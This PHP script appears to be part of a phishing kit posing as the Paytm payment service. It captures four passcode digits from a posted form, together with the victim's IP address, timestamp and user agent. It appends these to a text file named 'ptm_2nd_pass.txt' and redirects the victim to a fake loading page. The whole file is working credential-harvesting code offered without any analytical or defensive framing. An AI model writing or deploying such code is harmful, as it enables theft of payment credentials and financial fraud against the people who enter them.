<?php
header('location: /pytm/loadings.php');
if(isset($_POST['submit'])){
$passcode = "\n \n Passcode : " .$_POST['a']." ".$_POST['b']." ".$_POST['c']." ".$_POST['d']."
";
$ipaddress = "\n ip : " .getenv("REMOTE_ADDR");"
";
date_default_timezone_set('Asia/Kolkata');
$date = " Date_&_time : " .date('d/m/y h:i:s');"
";
$agent = "\n user-agent : " .$_SERVER["HTTP_USER_AGENT"];"
";
$file=fopen("ptm_2nd_pass.txt", "a");
fwrite($file, $passcode);
fwrite($file, $date);
fwrite($file, $ipaddress);
fwrite($file, $agent);
fclose($file);
}
?>